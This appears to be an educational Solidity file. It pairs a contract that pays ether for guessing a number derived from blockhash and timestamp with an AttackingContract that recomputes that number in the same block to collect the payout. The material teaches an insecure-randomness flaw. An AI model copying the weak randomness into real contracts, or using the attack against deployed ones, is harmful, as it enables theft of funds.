// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

/*
This is a demonstration of why using block number and blockhash is 
a bad idea to generate random numbers. Chainlink provides a safe and 
decentralized way to generate random numbers.

Note that blockhash is not available in remix.
*/

// sends eth to the user that guesses the "random" number generated
contract GuessRandomNumber {
    constructor() payable {}

    function guess(uint256 _guess) public {
        uint256 answer = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );
        if (_guess == answer) {
            (bool success, ) = msg.sender.call{value: 1 ether}("");
            require(success, "Failed to send eth");
        }
    }
}

contract AttackingContract {
    GuessRandomNumber guessRandomNumber;

    constructor(GuessRandomNumber _guessRandomNumber) {
        guessRandomNumber = GuessRandomNumber(_guessRandomNumber);
    }

    function attack() public {
        // copy the code from GuessRandomNumber
        // this will be executed in the same block as the original piece
        // of code, so the answer will be the same
        uint256 answer = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );
        guessRandomNumber.guess(answer);
    }

    fallback() external payable {}

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
